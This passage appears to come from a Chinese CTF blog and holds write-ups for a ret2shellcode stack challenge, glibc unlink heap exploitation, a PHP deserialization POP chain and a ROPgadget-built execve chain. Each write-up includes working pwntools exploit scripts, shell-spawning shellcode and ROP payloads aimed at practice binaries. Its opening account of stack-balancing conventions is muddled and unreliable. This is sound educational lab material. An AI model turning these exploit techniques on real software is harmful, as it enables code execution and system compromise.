Stack）是一种特殊的栈，可以存储元素，并可以支持压栈和弹栈操作，但需要额外的内存空间。与内平栈不同，外平栈不使用指针来跟踪堆栈顶部的位置，而是使用两个变量：一个用于标识堆栈顶部的位置(esp)，另一个用于标识堆栈底部的位置(ebp)。当元素被压入堆栈时，顶部变量会指向新元素，表示它是当前堆栈的顶部。当元素被弹出堆栈时，底部变量会指向上一个元素的位置，表示它是当前堆栈的新底部。这样，两个变量就可以在堆栈操作过程中保持堆栈平衡。 程序分析checksec看一下保护机制 123456[*] &#x27;/home/chen/pwn&#x27; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 保护机制全部关闭 再ida看一下 12345678910111213141516171819202122232425.text:08048060 public _start.text:08048060 _start proc near ; DATA XREF: LOAD:08048018↑o.text:08048060 push esp.text:08048061 push offset _exit.text:08048066 xor eax, eax.text:08048068 xor ebx, ebx.text:0804806A xor ecx, ecx.text:0804806C xor edx, edx.text:0804806E push 3A465443h.text:08048073 push 20656874h.text:08048078 push 20747261h.text:0804807D push 74732073h.text:08048082 push 2774654Ch.text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h ; LINUX - sys_write.text:08048091 xor ebx, ebx.text:08048093 mov dl, 3Ch ; &#x27;&lt;&#x27;.text:08048095 mov al, 3.text:08048097 int 80h ; LINUX -.text:08048099 add esp, 14h.text:0804809C retn.text:0804809C _start endp ; sp-analysis failed 应该不是用c语言编译的 很干净 只有一个exit函数和start函数 反编译后看不出什么所以然 并且可以看到没有ebp指针 说明这题是内平栈 是利用esp指针来控制程序执行流 123456789101112__int64 start()&#123; __int64 result; // rax result = 0x3C00000003LL; __asm &#123; int 80h; LINUX - sys_write int 80h; LINUX - &#125; return result;&#125; 这里直接解读汇编吧 123456.text:08048060 push esp.text:08048061 push offset _exit.text:08048066 xor eax, eax.text:08048068 xor ebx, ebx.text:0804806A xor ecx, ecx.text:0804806C xor edx, edx 前面6行对这个栈帧进行了初始化的操作 push入栈了esp 接着入栈了返回地址为exit函数 随后对于四个寄存器进行了归零操作 12345.text:0804806E push 3A465443h.text:08048073 push 20656874h.text:08048078 push 20747261h.text:0804807D push 74732073h.text:08048082 push 2774654Ch 16进制转化成人话就是: Let’s start the CTF: 这里的五次push 使得esp指向减少了0x14 此时的栈帧结构为: 12345.text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h 接着把esp所指向的内存空间赋值给了ecx 这里可以看到ida识别出来了 其被作为一个函数的addr参数 这个函数是什么先别急 我们一行一行看 这里出现了一个新的寄存器名称 为什么只是dl？ 并且在ida中我们选中其 会和edx一起关联起来 二者有什么关系？ 1234567832位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。Eax是32位寄存器，ax是16位寄存器,al(ah)是八位寄存器Eax可以存储的数字是DWORD（双字）ax存储的是WORD（字）AL(AH)存储的是BYTE（字节），那么为什么又有AH和AL呢，我们可以这样理解，AX=AH+AL，AH存储的是AX的高８位数据，AL存储的是AX的低八位数据。H这里就是HIGH,Ｌ就是LOW.取自https://blog.csdn.net/EVEPITWANG/article/details/89447466 相当于给这个函数赋值了长度参数(ida识别出来的len) 那么接下来的bl寄存器同理 相当于ebx的低8位 赋值为了1 重点来了 eax的低八位被赋值为了4 随后进行了int 0x80 也就是系统调用 那么我们查询一下调用号为4的函数是什么 发现是write函数 (5条消息) linux 系统调用号表_Anciety的博客-CSDN博客_系统调用号 那么上述汇编代码翻译成c语言也就是 1write(1,esp,0x14) 所以 相当于输出了上面push入栈的那0x14字节的数据 也就是输出了相应的字符串 但是这里注意一下 栈仍然是不变的 此时栈的结构和esp指针仍然是保留原状(即上文的图所示) 接下来再看 1234.text:08048091 xor ebx, ebx.text:08048093 mov dl, 3Ch ; &#x27;&lt;&#x27;.text:08048095 mov al, 3.text:08048097 int 80h ; LINUX - 赋值了两个参数 edx(参数len)为0x3c eax(系统调用号)为3 还有xor ebx,ebx相当于ebx赋为0 调用号3是read函数 也就是 1read(0,esp,0x3c) 所以我们可以在esp指针指向的地方 输入0x3c字节数据 接着看剩下的代码 12.text:08048099 add esp, 14h.text:0804809C retn 使esp寄存器的值增加0x14 此时esp指向的是存放offset _exit地址的空间 随后retn指令相当于pop eip 也就是控制程序执行流到exit函数 进行一个退出 在retn过后 此时栈帧就只剩下一个old esp了 分析完了程序 那么我们来想一下利用的思路 我们拥有栈溢出的机会 并且得知了具体哪一块栈空间可以用来控制程序执行流 并且保护全关 没有system函数也没有泄露libc的机会 也没有足够的栈溢出长度来供我们使用onegadget生成的shellcode直接pwn 那么这时候想到的是ret2shellcode 我们只能在栈上写入shellcode 但是没有bss段供我们写入的机会 所以只能写在栈上 那么要做的就是泄露栈上的地址 想一下 程序唯一能够利用输出的地方也就是write函数那边了 12345.text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h ; LINUX - sys_write 看到第一个 mov ecx,esp 我们再联想到 retn指令执行完了以后 栈帧只剩下了old esp 并且此时esp仍然指向old esp 此时如果执行 这一行指令 那么ecx的值就会被赋为old esp 也就是程序会输出old esp 也就是泄露了栈地址 所以我们第一次写入的payload为 12payload = cyclic(0x14)+p32(0x8048087)#0x14字节的垃圾数据用来填充push入栈的那串字符串 p32(0x8048087)覆盖的是offset _exit 用来控制程序执行流 此时程序就会输出old esp 那么接下来又要怎么利用 我们知道 控制程序执行流利用的是retn这个指令 但是在其生效前 esp指针会被抬高0x14字节 所以我们需要0x14字节的垃圾数据 然后再往栈上写入shellcode存放的地址 然后控制程序执行流到shellcode 这一系列的操作用图演示为; 所以此时eip接收到了stack_addr(我们泄露的栈地址)+0x14 其寻址到shllcode的栈空间 于是我们就获取了shell 完整的exp: 12345678910from pwn import*io = process(&quot;./pwn&quot;)io.recv()payload = cyclic(0x14)+p32(0x8048087)io.send(payload)stack_addr = u32(io.recv(4))shellcode = b&quot;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&quot;#这里不能用pwntools生成的shellcode 估计是太长了 溢出空间不够payload = cyclic(0x14)+p32(stack_addr+0x14)+shellcodeio.send(payload)","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"unlink","slug":"unlink","date":"2022-11-28T15:31:20.000Z","updated":"2022-12-02T03:28:44.969Z","comments":true,"path":"2022/11/28/unlink/","link":"","permalink":"http://example.com/2022/11/28/unlink/","excerpt":"","text":"很多时候 堆题的操作都是篡改got表 从而getshell 为了达到这一目的 就需要我们得到任意地址写的机会 其中unlink就是一个典型的办法 其主要分为两种情况 向后合并和向前合并 向后合并本次演示基于的二进制文件 这里就不展示反编译后的代码了 其拥有堆溢出的机会 所以我们可以通过这个修改chunk的size域 先来看一下用于调试的代码 12345create(0,0x18)create(1,0x28)create(2,0x28)payload = cyclic(0x18)+b&quot;\\x61&quot;edit(0,payload) 申请了三个堆块 chunk0是用于堆溢出覆盖chunk1的size域 gdb查看一下当前堆的状况 可以看到chunk1和chunk2已经成功合并了 并且你要注意一下大小 chunk1我们申请的是0x28 但是由于堆的机制 64位的情况下申请的堆块的基本单位是0x10 所以此时这个堆块的用户空间是0x20 而gdb上显示的是0x31(0x20+0x10+0x1) 所以溢出覆盖size域的大小应该是chunk实际占用的大小 如果利用这种机制呢？我们chunk此时是和chunk1合并了 但是我们仍然有一个指向chunk2的指针不是吗？ 如果我们此时再edit chunk2 输入的数据会存放在哪里呢 1234567create(0,0x18)create(1,0x28)create(2,0x28)payload = cyclic(0x18)+b&quot;\\x61&quot;edit(0,payload)edit(2,b&quot;aaaaaaaa&quot;)gdb.attach(io) 其仍然有效 此时你有没有一些利用的想法 利用这个系统觉得不存在的指针？ 123456789101112create(0,0x18)create(1,0x68)create(2,0x68)create(3,0x20)payload = cyclic(0x18)+b&quot;\\xe1&quot;edit(0,payload)delete(1)create(4,0x68)create(5,0x68)delete(5)edit(2,b&quot;aaaaaaaa&quot;)gdb.attach(io) 看一下这个流程 看看能不能领会其用意 我们逐步分析一下 申请的chunk0，1，2没有什么疑问 是为了合并chunk chunk3是为了防止chunk1释放以后和top chunk合并 紧接着申请了一个0x68大小的chunk4 系统就会把之前存储在unsortedbin的0xe0大小的chunk分割 此时chunk4申请到的内存空间和chunk1(未合并前)是一样的 此时我们再次申请0x68大小的chunk 分配给chunk5的就是原先chunk2的空间了 但是这里注意一下 chunk2的指针是不是仍然存在 那我们就拥有了两个指向同一内存空间的指针 我们哪怕释放掉了这个chunk 我们也可以edit其内容 如果这个chunk被释放到了fastbin呢？那么我们edit其chunk内容 是不是输入的第一个字长就是覆盖了fd域的空间 也就是说 我们伪造了一个fake chunk 让系统以为 当前的单向链表 这个chunk的下一个是我们伪造的内存空间 可以看到 系统把aaaaaaaa当成了一个chunk的地址 是不是觉得很简单 那么我们接下来再看unlink的源码 1234567891011121314151617181920212223242526272829303132333435363738394041/* Take a chunk off a bin list. */static voidunlink_chunk (mstate av, mchunkptr p)&#123;//检查chunk的size和next_chunk的prev_size是否一致if (chunksize (p) != prev_size (next_chunk (p)))malloc_printerr (“corrupted size vs. prev_size”);mchunkptr fd = p-&gt;fd;mchunkptr bk = p-&gt;bk;//检查fd和bk(双向链表完整性)if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))malloc_printerr (“corrupted double-linked list”);fd-&gt;bk = BK;bk-&gt;fd = FD;if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)&#123;//检查largebin中next_size双向链表的完整性if (p-&gt;fd_nextsize-&gt;bk_nextsize != p|| p-&gt;bk_nextsize-&gt;fd_nextsize != p)malloc_printerr (“corrupted double-linked list (not small)”);if (fd-&gt;fd_nextsize == NULL)&#123;if (p-&gt;fd_nextsize == p)fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;else&#123;fd-&gt;fd_nextsize = p-&gt;fd_nextsize;fd-&gt;bk_nextsize = p-&gt;bk_nextsize;p-&gt;fd_nextsize-&gt;bk_nextsize = fd;p-&gt;bk_nextsize-&gt;fd_nextsize = fd;&#125;&#125;else&#123;p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;&#125;&#125;&#125; 主要有两个检查 1.检查当前chunk的size和nextchunk的prev_size是否相同 2.检查链表的完整性，即fd和bk 这里size的检查很容易就绕过了 接下来的理解难点在于链表的fd和bk的伪造 123if(__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P,0)) malloc_printerr (&quot;corrupted double-linked list&quot;);//其中的FD和BK和P为上图所示 关键在于这一个if判断 如果你和我一样 学到这里的时候 c语言的指针都还没学透 那你可以仔细阅读下面这段话 方便你理解接下来的判断式 123FD-&gt;bk相当于表示FD结构体的成员bk 而bk为结构体变量指针类型存储的是FD的上一个chunk，即P的prev_size的地址BK-&gt;fd同理 把这两个判断转化一下就是 unlink过后 BK和FD就抛弃了中间的P 他们二者的fd和bk指针互连 1234567FD-&gt;bk != P || BK-&gt;fd != PFD和BK之前已经定义过了FD = P-&gt;fd;BK = P-&gt;bk;所以上述的式子相当于:P-&gt;fd-&gt;bk == P &lt;=&gt; *(p-&gt;fd +0x18) == P &lt;=&gt;相当于恒等于p-&gt;bk-&gt;fd == P &lt;=&gt; *(p-&gt;bk +0x10) == P 所以我们构造的fake_chunk的fd应该是ptr_addr-0x18 bk应该是ptr_addr-0x10 这里的ptr_addr即为我们想要任意写的地址 检查通过以后 程序就会按照下面的式子修改FD和BK的fd和bk指针 12FD-&gt;bk = BK &lt;=&gt; P-&gt;fd-&gt;bk = p-&gt;bk &lt;=&gt; *(P-&gt;fd + 0x18) = P-&gt;bk //ⅠBK-&gt;fd = FD &lt;=&gt; P-&gt;bk-&gt;fd = p-&gt;fd &lt;=&gt; *(P-&gt;bk + 0x10) = P-&gt;fd //Ⅱ 12345I式的演变过程:∵ P-&gt;fd = &amp;P - 0x18 ∴ *(&amp;P - 0x18 + 0x18) = P-&gt;bk =&gt; P = P-&gt;bk∵ P-&gt;bk = &amp;P - 0x10 ∴ P = &amp;P - 0x10 12345II式的演变过程:∵ P-&gt;bk = &amp;P - 0x10 ∴ *(P-&gt;bk + 0x10) = P-&gt;fd =&gt; P = P-&gt;fd∵ P-&gt;fd = &amp;P - 0x18 ∴ P = &amp;P - 0x18 所以 最后的p指针将指向&amp;p-0x18的位置 也就是说当我们成功unlink后 需要增加3个字长的垃圾数据后 才能覆盖到ptr_addr 下面来看一下脚本 12345678910111213141516create(0,0x80)create(1,0x80)create(2,0x80)ptr_addr = 0x6020C0backdoor_addr = 0x400806payload = p64(0)+p64(0x80)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)payload = payload.ljust(0x80,b&quot;0&quot;)payload += p64(0x80)+p64(0x90)edit(0,len(payload),payload)delete(1)payload = p64(0)*3+p64(elf.got[&#x27;printf&#x27;])edit(0,len(payload),payload)edit(0,8,p64(backdoor_addr))io.recvuntil(&quot;:&quot;)io.sendline(b&quot;1&quot;)io.interactive() 我们先申请了三个chunk chunk0是用来构造fake_chunk chunk1则是用来迎合检查 chunk0此时的内部构造为 绿框部分是我们伪造的fakechunk 紫框为chunk1 我们将其的prev_size和size覆盖 为了通过第一个检查 随后我们释放chunk1 如果我们构造成功 此时系统就会检查我们构造的链表是否正确 如果通过了检查 我们构造的fakechunk就会从链表中脱离 于是我们就得到了一个指向ptr_addr-0x18地址的chunk 接下来要怎么利用 注意看上面脚本的ptr_addr是存放堆块指针的bss段的数组 我们利用unlink将其存放chunk0的地址修改成printf_got的地址 那么当我们第三次edit chunk0的时候 相当于就是往printf_got的地址写入数据 于是我们将后门函数的地址写进去 当下次调用printf函数的时候 就进行了系统调用(后门函数是我为了演示方便加进去的 一般题目不会这么简单) ps:这里在出unlink的题的时候 遇到了一个问题: 当释放chunk1想要进行unlink的时候 程序就会崩溃 后来经过两天的坐牢时间 发现了问题的原因出在于存放堆块指针的那个数组的低地址处也要有至少0x18大小的全局数组 即如下图所示 需要有个magic数组 各位师傅以后出unlink题的时候可以留意一下 为什么我们经常看到别人的wp会写说 多申请一个chunk用来防止和top chunk合并 下面看一下演示 12create(0,0x80)delete(0) 当我们只申请了一个chunk 并且将其释放以后 你预想的是他会进入对应的bin中 但是如果他物理相邻的高地址处的chunk是topchunk的话 topchunk就会触发向后合并 我们需要多申请一个chunk在要释放的chunk的物理相邻高地址处 123create(0,0x80)create(1,0x20)delete(0) 向前合并目前还没有遇到用到向前合并的题目 感兴趣的可以自行了解 利用FD和BK的fd、bk指针buu上遇到了一题比较新颖的unlink 和常规的有所不同 这里以此为例题来讲讲 其利用方向不是脱链获得任意写的机会 而是利用FD和BK在脱链后的fd和bk指针的变化来覆盖返回地址 控制程序执行流 123456[*] &#x27;/home/chen/unlink1&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32位的堆 还是比较少见的 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v4; // [esp+4h] [ebp-14h] BYREF _DWORD *v5; // [esp+8h] [ebp-10h] _DWORD *v6; // [esp+Ch] [ebp-Ch] malloc(0x400u); v4 = (char *)malloc(0x10u); v6 = malloc(0x10u); v5 = malloc(0x10u); *(_DWORD *)v4 = v6; v6[1] = v4; *v6 = v5; v5[1] = v6; printf(&quot;here is stack address leak: %p\\n&quot;, &amp;v4); printf(&quot;here is heap address leak: %p\\n&quot;, v4); puts(&quot;now that you have leaks, get shell!&quot;); gets(v4 + 8); unlink(v6); return 0;&#125; 申请了三个堆块 并且给出了堆块v4在栈上的地址和堆上的地址 这里为了方便理解 我修改了下三个chunk的名称 接下来请以下方的代码为准 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v4; // [esp+4h] [ebp-14h] BYREF _DWORD *v5; // [esp+8h] [ebp-10h] _DWORD *v6; // [esp+Ch] [ebp-Ch] malloc(0x400u); A = (char *)malloc(0x10u); B = malloc(0x10u); C = malloc(0x10u); *(_DWORD *)A = B; B[1] = A; *B = C; C[1] = B; printf(&quot;here is stack address leak: %p\\n&quot;, &amp;A); printf(&quot;here is heap address leak: %p\\n&quot;, A); puts(&quot;now that you have leaks, get shell!&quot;); gets(A + 8); unlink(B); return 0;&#125; 我们先来分析一下这四行代码对这三个堆块的内容进行了哪些操作 1234*(_DWORD *)A = B;B[1] = A;*B = C;C[1] = B; 第一行 *A&#x3D;B 将B的首地址存在了A的fd域(实际上A并没有被释放 所以其没有fd域 这里只是为了方便称呼) 第二行 B[1]&#x3D;A B[1]相当于B的bk域 存储了A的首地址 第三行 *B&#x3D;C 将c的首地址存在了B的fd域 第四行 C[1]&#x3D;B 同理 将B的首地址存储在了c的bk域 用图片来展示一下 此时三个堆块的情况 可以看到 相当于模拟了三个chunk在双向链表中的情况 接着给了我们一次堆溢出的机会 get(A+8)相当于往A的bk域再往下一个字长处写入数据 即data域 接着跟进一下unlink函数 12345678910111213_DWORD *__cdecl unlink(int *a1)&#123; _DWORD *result; // eax int fd; // [esp+8h] [ebp-8h] _DWORD *bk; // [esp+Ch] [ebp-4h] bk = a1[1]; fd = *a1; *(fd + 4) = bk; result = bk; *bk = fd; return result;&#125; 因为unlink的参数是B 所以此时bk和fd的赋值就是其名(我同样对变量名称进行了修改) 在fd+4地址处的内容赋值为bk 并且将bk地址处的内容赋值为fd 那么这里就存在了一次任意地址写 如果我们通过堆溢出将fd覆盖为想要任意写的内容 接着将bk覆盖为想要任意写的地址 就可以利用这一漏洞 分析完了程序的主体流程和漏洞 接下来就是想着怎么利用了 在左侧的函数栏中发现了一个后门函数 那么显然就是要将此后门函数覆盖某一地址 然后进行系统调用 但是不同于以往的覆盖got表 这里在unlink函数结束以后 并没有调用任何libc函数 那么只能将目光看向 main函数的栈帧结束后 汇编代码是如果ret到父函数 1234567.text:080485F2 call unlink.text:080485F7 add esp, 10h.text:080485FA mov eax, 0.text:080485FF mov ecx, [ebp+var_4].text:08048602 leave.text:08048603 lea esp, [ecx-4].text:08048606 retn lea esp, [ecx-4] 显然 我们要利用的就是这一串汇编代码 他会控制程序执行流往ecx-4所存储的地址 再看到 mov ecx, [ebp+var_4] ecx的值等同于ebp-4地址的值 所以 我们就要利用堆溢出 覆盖B-&gt;fd为存储后门函数地址的地址 B-bk为ebp-4的地址 12345678910111213141516from pwn import*io = process(&quot;./unlink1&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25709)elf = ELF(&quot;./unlink1&quot;)context.log_level = &quot;debug&quot;io.recvuntil(&quot;here is stack address leak: &quot;)stack_addr = int(io.recvuntil(&quot;\\n&quot;,drop = True),16)io.recvuntil(&quot;here is heap address leak: &quot;)heap_addr = int(io.recvuntil(&quot;\\n&quot;,drop = True),16)io.recvuntil(&quot;now that you have leaks, get shell!&quot;)shellheap_addr = heap_addr+12ebp4_addr = stack_addr+0x14-0x4shell_addr = 0x80484EBpayload = p32(shell_addr)+b&#x27;a&#x27;*12+p32(shellheap_addr)+p32(ebp4_addr)io.send(payload)io.interactive()","categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"}],"tags":[]},{"title":"NISACTF常态化题库","slug":"NISACTF常态化题库","date":"2022-11-25T11:37:14.000Z","updated":"2022-11-25T11:58:21.484Z","comments":true,"path":"2022/11/25/NISACTF常态化题库/","link":"","permalink":"http://example.com/2022/11/25/NISACTF%E5%B8%B8%E6%80%81%E5%8C%96%E9%A2%98%E5%BA%93/","excerpt":"","text":"babypop这是一题简单的反序列化pop链构造 1234567891011121314151617181920212223242526272829303132333435363738 &lt;?phpfunction show_me_flag()&#123; system(&quot;tac /flag&quot;);&#125;error_reporting(0);class NISA&#123; public $fun; public function __wakeup() &#123; if($this-&gt;fun==&quot;show_me_flag&quot;)&#123; die(&quot;rookie hacker plz go back and do your own homework!&quot;); &#125; &#125; function __call($from,$val)&#123; $this-&gt;fun=$val[0]; &#125; public function __toString() &#123; call_user_func($this-&gt;fun); return &quot; &quot;; &#125;&#125;class Caller&#123; public $ext; public $x; public function __wakeup() &#123; $this-&gt;ext-&gt;nisa($this-&gt;x); echo $this-&gt;ext; &#125;&#125;if(isset($_GET[&#x27;ser&#x27;]))&#123; @unserialize($_GET[&#x27;ser&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125; 进行pop链构造 首先要确定结尾和起点 这里看到了call_user_func和showmeflag 可以利用这里调用 再看所属的方法名 是__toString 其是当对象被作为字符串时调用的 也就是说echo 一个对象的时候 就会跳转到这个函数 所以这里看到caller的wakeup 逐步刨析一下执行步骤 ext为NISA类对象 这时候又会触发_call魔术方法 $x就被作为参数传给fun 紧接着就是跳转到tostring 执行showmeflag函数 1234567891011121314&lt;?phpclass NISA&#123; public $fun ;&#125;class Caller&#123; public $ext; public $x = &quot;show_me_flag&quot;;&#125;$a = new NISA();$b = new Caller();$b -&gt; ext = $a;echo serialize($b);?&gt; 得到flag","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[]},{"title":"inndy_rop","slug":"inndy-rop","date":"2022-11-24T15:34:05.000Z","updated":"2022-11-24T15:41:11.160Z","comments":true,"path":"2022/11/24/inndy-rop/","link":"","permalink":"http://example.com/2022/11/24/inndy-rop/","excerpt":"","text":"这一题以前没遇到过 算是蛮新奇的 所以记录下来 还学到了ROPgadget的新用法 123456[*] &#x27;/home/chen/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32位 没有开启pie和canary ida打开后发现只有一个简单的gets溢出的机会 123456int overflow()&#123; char v1[12]; // [esp+Ch] [ebp-Ch] BYREF return gets(v1);&#125; 并且这题是静态编译 ida打开会出现一大堆乱七八糟的函数 静态编译没有调用libc函数 所以这题也就不存在泄露libc然后获取system函数地址 进行系统调用的做法了 那么这时候 就需要用到ROPgadget其一个功能 自动生成一串rop链 1ROPgadget --binary file_name --ropchain 123456789101112131415161718192021222324252627282930313233343536# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80 他已经自动帮我们生成好脚本了 我们只需要手动加上偏移 就可以pwn成功 但是这里需要注意 你需要添加一个库 如果没有这个库 脚本会报错 123456Traceback (most recent call last): File &quot;/home/chen/exp.py&quot;, line 51, in &lt;module&gt; p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret File &quot;/home/chen/.local/lib/python3.6/site-packages/pwnlib/util/packing.py&quot;, line 102, in pack if sign is None and number &lt; 0:TypeError: &#x27;&lt;&#x27; not supported between instances of &#x27;str&#x27; and &#x27;int&#x27; 库: 1from struct import pack 完整exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import*from struct import packdef libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_32&#x27;ip=&quot;node4.buuoj.cn&quot;port=27246elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)p = b&#x27;a&#x27; * (0xc+0x4)p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 